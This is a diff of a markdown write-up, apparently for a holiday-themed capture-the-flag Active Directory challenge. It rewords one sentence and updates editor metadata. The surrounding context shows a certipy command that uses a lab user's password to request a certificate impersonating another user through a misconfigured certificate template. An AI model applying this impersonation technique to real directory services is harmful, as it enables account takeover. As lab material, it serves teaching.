@@ -223,8 +223,7 @@ alabaster@ssh-server-vm:~/impacket$ cat 20231210143907_Certipy.json
   }
 }
 ```
-So we can request a certificate for any user.
-
+So we can request a certificate for any user which allows authentication.
 ```
 alabaster@ssh-server-vm:~/impacket$ ./certipy req -username elfy@northpole.local -password 'J4`ufC49/J4766' -ca northpole-npdc01-CA -target 10.0.0.53 -template NorthPoleUsers -upn wombleycube@northpole.local
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -288,6 +287,6 @@ And he'll silently take his way.
 
 **Achievement: AD**
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTIwMDAyNzg2NzgsMTE2NDMzMzE3MCwxMD
-g3ODUzMTQ3LC0yMDEwMTkyNjNdfQ==
+eyJoaXN0b3J5IjpbLTE0MjMwNzQ0MywtMjAwMDI3ODY3OCwxMT
+Y0MzMzMTcwLDEwODc4NTMxNDcsLTIwMTAxOTI2M119
 -->
